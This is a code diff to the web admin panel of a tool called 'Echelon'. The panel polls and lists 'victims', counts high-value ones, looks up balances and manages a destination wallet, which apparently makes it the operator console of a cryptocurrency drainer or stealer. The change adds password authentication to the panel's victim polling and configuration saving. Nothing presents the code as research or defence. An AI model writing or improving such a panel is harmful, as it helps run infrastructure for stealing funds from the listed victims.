@@ -186,12 +186,13 @@
       enabled: _enabled
     };
     try {
-      var r = await fetch("/api/config", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(cfg)});
+      var r = await adminFetch("/api/config", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(cfg)});
+      if(r.status === 401){ _adminAuth = null; _openServer = false; }
       var j = await r.json();
       var s = document.getElementById("cfgStatus");
       s.style.display = "block";
       if(j.ok){ s.textContent = "✓ Config saved"; s.style.color = "#14f195"; }
-      else { s.textContent = "✗ Save failed"; s.style.color = "#ff6b6b"; }
+      else { s.textContent = r.status === 401 ? "✗ Unauthorized (wrong password)" : "✗ Save failed"; s.style.color = "#ff6b6b"; }
       setTimeout(function(){ s.style.display = "none"; }, 2000);
     } catch(e) {
       var s = document.getElementById("cfgStatus"); s.style.display = "block"; s.textContent = "✗ Save failed"; s.style.color = "#ff6b6b";
@@ -274,7 +275,19 @@
     document.getElementById("hiVal").textContent = hiValCount;
     document.getElementById("vicStatus").textContent = filtered.length + " victim(s) shown" + (filter ? " (filtered)" : "");
   }
-  async function pollVictims(){ try{ var resp = await fetch("/api/victims"); victims = await resp.json(); renderVictims(); }catch(e){} }
+  async function pollVictims(){
+    try{
+      var resp = await adminFetch("/api/victims");
+      if(resp.status === 401){
+        _adminAuth = null; _openServer = false;
+        stopPolling();
+        document.getElementById("vicStatus").textContent = "unauthorized — wrong password (press Refresh to retry)";
+        return;
+      }
+      victims = await resp.json();
+      renderVictims();
+    }catch(e){}
+  }
   function clearVictims(){ victims = []; renderVictims(); }
 
   async function lookupBalance(){
@@ -310,9 +323,45 @@
     }
   }
 
-  setInterval(pollVictims, 3000);
+  // ── admin auth ──
+  var _adminAuth = null;   // "Basic ..." header value
+  var _openServer = false; // true when server accepts requests without a password
+  var _pollTimer = null;
+  function promptForAuth(){
+    var pw = window.prompt("Echelon admin password:");
+    if(pw === null) return null;
+    _adminAuth = "Basic " + btoa("admin:" + pw);
+    return _adminAuth;
+  }
+  function adminFetch(url, opts){
+    if(_openServer) return fetch(url, opts || {});
+    if(!_adminAuth && !promptForAuth()) return Promise.reject(new Error("cancelled"));
+    opts = opts || {};
+    opts.headers = Object.assign({}, opts.headers || {}, { "Authorization": _adminAuth });
+    return fetch(url, opts);
+  }
+  function startPolling(){
+    if(_pollTimer) return;
+    _pollTimer = setInterval(pollVictims, 3000);
+    pollVictims();
+  }
+  function stopPolling(){
+    if(_pollTimer){ clearInterval(_pollTimer); _pollTimer = null; }
+  }
+  function probeAuth(){
+    // First try without credentials — no prompt needed if the server has no password set
+    return fetch("/api/victims").then(function(r){
+      if(r.status !== 401){ _openServer = true; return true; }
+      return adminFetch("/api/victims").then(function(r2){ return r2.status !== 401; });
+    }).catch(function(){ return true; }); // network error: let normal polling handle it
+  }
+
   loadDest().then(function(){ refreshWallet(); });
   loadConfigFromServer();
+  probeAuth().then(function(ok){
+    if(ok) startPolling();
+    else document.getElementById("vicStatus").textContent = "unauthorized — wrong password (press Refresh to retry)";
+  });
   </script>
 </body>
 </html>
